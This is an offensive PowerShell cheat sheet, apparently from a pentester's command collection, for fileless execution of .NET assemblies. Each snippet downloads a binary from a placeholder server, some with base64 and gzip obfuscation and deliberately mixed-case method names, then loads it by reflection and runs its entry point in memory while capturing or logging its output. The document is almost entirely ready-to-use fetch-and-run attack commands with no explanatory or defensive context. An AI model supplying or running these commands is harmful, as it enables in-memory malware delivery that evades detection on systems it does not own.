# pwsh

% powershell, assembly reflection

#plateform/windows #target/remote #cat/UTILS/FILE_TRANSFERT #tag/powershell 


## Assembly - load from http
```powershell
$asm = [System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData('http://<server>/<binary>')); 
```

## Assembly - load from http obfuscated (gziped, base64)

```powershell
$params="<asm_ref_params>".split(" ");$b64 = (New-Object System.Net.WebClient).DownloadString('http://<server>/<binary>');$gzB=[Convert]::FromBAsE64String($b64);$ms = New-Object IO.MemoryStream(,$gzB);$gz = New-Object IO.Compression.GzipStream($ms,[IO.Compression.CoMPressionMode]::DEComPress);$o = New-Object IO.MemoryStream; $gz.CopyTo($o);$asm = [System.Reflection.Assembly]::Load($o.ToArray());
```

## Assembly - run from memory 
```powershell
$params="<asm_ref_params>".split(" ");$OldConsoleOut = [Console]::Out; $StringWriter = New-Object IO.StringWriter ; [Console]::SetOut($StringWriter) ; $asm.EntryPoint.Invoke($null, [Object[]] @(@(,($params))));[Console]::SetOut($OldConsoleOut); $Results = $StringWriter.ToString(); $Results
```

## Assembly - run from memory (real-time log to file)
```powershell
$params="<asm_ref_params>".split(" ");$OldConsoleOut = [Console]::Out; $Writer = [System.IO.StreamWriter]::new("<log_file_path>");$Writer.AutoFlush = $true; [Console]::SetOut($Writer) ; $asm.EntryPoint.Invoke($null, [Object[]] @(@(,($params))));[Console]::SetOut($OldConsoleOut);
```


## Assembly - run from http obfuscated (gziped, base64)
```powershell
$params="<asm_ref_params>".split(" ");$b64 = (New-Object System.Net.WebClient).DownloadString('http://<server>/<binary>');$gzB=[Convert]::FromBAsE64String($b64);$ms = New-Object IO.MemoryStream(,$gzB);$gz = New-Object IO.Compression.GzipStream($ms,[IO.Compression.CoMPressionMode]::DEComPress);$o = New-Object IO.MemoryStream; $gz.CopyTo($o);$asm = [System.Reflection.Assembly]::Load($o.ToArray()); $asm.EntryPoint.Invoke($null, [Object[]] @(@(,($params))));[Console]::SetOut($OldConsoleOut); $Results = $StringWriter.ToString(); $Results
```
